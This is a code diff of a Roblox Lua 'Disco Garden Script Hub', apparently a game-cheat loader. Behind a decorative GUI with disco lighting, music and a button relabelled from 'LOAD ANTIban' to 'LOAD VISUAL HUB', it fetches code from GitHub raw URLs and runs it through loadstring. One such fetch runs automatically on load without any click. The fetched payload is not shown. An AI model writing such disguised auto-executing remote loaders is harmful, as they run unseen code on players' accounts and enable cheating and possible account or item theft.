@@ -1,44 +1,37 @@
+-- Disco Garden Script Hub
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
 local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
 
-
+-- Main GUI
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "DiscoGardenGUI"
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = player:WaitForChild("PlayerGui")
 
+-- ========== 1ST SCRIPT AUTO-EXECUTE ==========
 local function ExecuteFirstScript()
     local success, err = pcall(function()
-        -- Using direct GitHub raw link
         local response = game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/main/5631075000133c7fa307da94f3bc5b7c.txt", true)
-        if response then
+        if response and response ~= "" then
             local func = loadstring(response)
-            if func then
-                func()
-                print("First script executed successfully!")
-            end
+            if func then func() end
+        else
+            error("Empty response from first script.")
         end
     end)
     if not success then
-        warn("First script failed:", err)
+        warn("First script failed: " .. tostring(err))
     end
 end
 
-spawn(function()
-    pcall(ExecuteFirstScript)
-end)
+-- Run first script safely
+task.spawn(ExecuteFirstScript)
 
-
+-- ========== DISCO LIGHT EFFECT ==========
 local function SetupDiscoLights()
-    -- Change ambient lighting
-    Lighting.Ambient = Color3.fromRGB(130, 130, 130)
-    Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
-    Lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
-    
-
     local discoColors = {
         Color3.fromRGB(255, 0, 0),
         Color3.fromRGB(0, 255, 0),
@@ -46,20 +39,20 @@ local function SetupDiscoLights()
         Color3.fromRGB(255, 255, 0),
         Color3.fromRGB(255, 0, 255)
     }
-    
-    spawn(function()
+
+    task.spawn(function()
         while true do
-            local randomColor = discoColors[math.random(1, #discoColors)]
-            Lighting.Ambient = randomColor
-            Lighting.OutdoorAmbient = randomColor
-            wait(0.5)
+            local color = discoColors[math.random(1, #discoColors)]
+            Lighting.Ambient = color
+            Lighting.OutdoorAmbient = color
+            task.wait(0.5)
         end
     end)
 end
 
 SetupDiscoLights()
 
-
+-- ========== MAIN UI FRAME ==========
 local MainFrame = Instance.new("Frame")
 MainFrame.Size = UDim2.new(0.4, 0, 0.3, 0)
 MainFrame.Position = UDim2.new(0.3, 0, 0.35, 0)
@@ -77,17 +70,18 @@ local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, 0, 0.2, 0)
 Title.Text = "DISCO GARDEN HUB"
 Title.Font = Enum.Font.GothamBold
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextColor3 = Color3.new(1, 1, 1)
 Title.TextSize = 24
 Title.BackgroundTransparency = 1
 Title.Parent = MainFrame
 
+-- ========== DARK HUB VISUAL BUTTON ==========
 local Button = Instance.new("TextButton")
-Button.Name = "Garden Spawener"
+Button.Name = "VisualHubButton"
 Button.Size = UDim2.new(0.8, 0, 0.5, 0)
 Button.Position = UDim2.new(0.1, 0, 0.3, 0)
-Button.BackgroundColor3 = Color3.fromRGB(80, 180, 120) -- Garden green
-Button.Text = "LOAD ANTIban"
+Button.BackgroundColor3 = Color3.fromRGB(80, 180, 120)
+Button.Text = "LOAD VISUAL HUB"
 Button.Font = Enum.Font.GothamBold
 Button.TextColor3 = Color3.new(1, 1, 1)
 Button.TextSize = 18
@@ -99,27 +93,25 @@ ButtonCorner.Parent = Button
 
 Button.MouseButton1Click:Connect(function()
     local success, err = pcall(function()
-        local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/ataturk123/GardenSpawner/refs/heads/main/Spawner.lua"))()
-        if Spawner and typeof(Spawner.Load) == "function" then
-            Spawner.Load()
-            Button.Text = "SUCCESS! 🌱"
+        local func = loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/DARK%20HUB%20VISUAL"))()
+        if func then
+            Button.Text = "SUCCESS! 🌿"
             task.wait(2)
-            Button.Text = "LOAD SPAWNER"
+            Button.Text = "LOAD VISUAL HUB"
         else
-            error("Spawner or Spawner.Load missing")
+            error("loadstring returned nil")
         end
     end)
 
     if not success then
-        warn("Spawner Load Failed: " .. tostring(err))
+        warn("VISUAL HUB failed: " .. tostring(err))
         Button.Text = "ERROR! TRY AGAIN"
         task.wait(2)
-        Button.Text = "LOAD SPAWNER"
+        Button.Text = "LOAD VISUAL HUB"
     end
 end)
 
-
-
+-- ========== CLOSE BUTTON ==========
 local CloseButton = Instance.new("TextButton")
 CloseButton.Name = "CloseButton"
 CloseButton.Size = UDim2.new(0.1, 0, 0.2, 0)
@@ -135,7 +127,7 @@ CloseButton.MouseButton1Click:Connect(function()
     MainFrame.Visible = false
 end)
 
-
+-- ========== MUSIC ==========
 local sound = Instance.new("Sound")
 sound.SoundId = "rbxassetid://142376088"
 sound.Looped = true
@@ -143,6 +135,8 @@ sound.Volume = 0.7
 sound.Parent = player:WaitForChild("PlayerGui")
 sound:Play()
 
-
+-- Animate GUI on load
 MainFrame.Size = UDim2.new(0, 0, 0, 0)
-TweenService:Create(MainFrame, TweenInfo.new(0.7, Enum.EasingStyle.Elastic), {Size = UDim2.new(0.4, 0, 0.3, 0)}):Play()
+TweenService:Create(MainFrame, TweenInfo.new(0.7, Enum.EasingStyle.Elastic), {
+    Size = UDim2.new(0.4, 0, 0.3, 0)
+}):Play()
